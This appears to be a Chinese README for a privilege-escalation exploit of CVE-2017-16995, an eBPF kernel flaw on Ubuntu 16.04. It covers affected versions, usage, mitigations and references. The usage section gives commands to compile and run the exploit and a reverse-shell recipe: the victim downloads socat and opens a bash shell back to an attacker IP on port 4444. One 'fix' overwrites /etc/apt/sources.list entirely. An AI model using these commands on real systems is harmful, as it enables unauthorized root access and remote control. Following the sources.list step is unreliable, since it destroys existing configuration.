# CVE-2017-16995
Ubuntu是一个以桌面应用为主的开源GNU/Linux操作系统，基于Debian GNU/Linux 。近期有白帽子爆出 ubuntu 的最新版本（Ubuntu 16.04）存在本地提权漏洞，漏洞编号为CVE-2017-16995。该漏洞存在于调用eBPF bpf(2)的Linux内核系统中，当用户提供恶意BPF程序使eBPF验证器模块产生计算错误，导致任意内存读写问题， 低权限用户可使用此漏洞获得管理权限。

## 影响
```
Linux Kernel Version 4.14-4.4 
仅影响Ubuntu/Debian发行版本
```

## 用法
在交互式shell下可以直接使用如下命令提权：
```sh
gcc upstream.c -o pwn
./pwn
```
若显示参数错误，可以尝试使用交互式shell：
+ 攻击者监听：
```sh
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat file:`tty`,raw,echo=0 tcp-listen:4444
```
+ 受害者反弹shell：
```sh
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.21.11.21:4444
```

## 解决方案
1. 临时解决方案：`echo 1 > /proc/sys/kernel/unprivileged_bpf_disabled`
2. 升级内核版本：ubuntu 117 及以上的无此漏洞:
```sh
echo "deb http://archive.ubuntu.com/ubuntu/ xenial-proposed restricted main multiverse universe" > /etc/apt/sources.list
apt update
apt install linux-image-4.4.0-117-generic  
```

## 参考

* [http://cyseclabs.com/exploits/upstream44.c](http://cyseclabs.com/exploits/upstream44.c)  
* [https://access.redhat.com/security/cve/cve-2017-16995](https://access.redhat.com/security/cve/cve-2017-16995)  
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1454&desc=3](https://bugs.chromium.org/p/project-zero/issues/detail?id=1454&desc=3)  
* [http://www.freebuf.com/news/165608.html](http://www.freebuf.com/news/165608.html)  
* [jso502](https://github.com/jas502n/Ubuntu-0day)